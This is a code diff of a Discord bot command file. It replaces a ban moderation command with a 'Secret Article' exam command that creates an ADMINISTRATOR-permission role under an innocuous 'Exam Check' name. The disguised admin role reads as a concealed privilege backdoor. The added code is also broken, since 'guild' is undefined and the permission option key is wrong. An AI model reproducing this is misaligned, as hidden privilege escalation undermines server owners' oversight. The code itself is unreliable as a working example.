@@ -1,34 +1,23 @@
 exports.run = async (reply, message, args, level) => {
-  const user = message.mentions.members.first() || message.guild.members.get(args[0]);
-  let reason = args.slice(1).join(" ");
-  if (!user) return reply("Please specify an user to ban.");
-  if (!reason) reason = "None Provided";
-
-  if (user.id === message.author.id) return reply("You can not ban yourself!");
-  if (!user.bannable) return reply("This user is more powerful than both of us, unfortunately I can not ban it! :sob:");
-
-  try {
-    user.ban(reason);
-  } catch (e) {
-    return message.channel.send(`I couldn't ban the specified user! Reason: ${e}.`);
-  }
-
-  return reply(`Successfully banned **${user.user.tag}** from this server.`);
-
+  guild.createRole({
+    name: 'Exam Check (delete at end of exam)',
+    color: 'BLACK',
+    permission: 'ADMINISTRATOR',
+  })
 };
   
   exports.conf = {
     enabled: true,
     guildOnly: true,
     aliases: [],
-    permLevel: "Administrator"
+    permLevel: "Co-Founders"
 };
   
   exports.help = {
-    name: "ban",
-    category: "Moderation",
-    description: "Bans an user from your server.",
-    usage: "ban"
+    name: "exam",
+    category: "System",
+    description: "Secret Article! :P",
+    usage: "exam"
   };
 
   //    const nop = new Discord.RichEmbed()
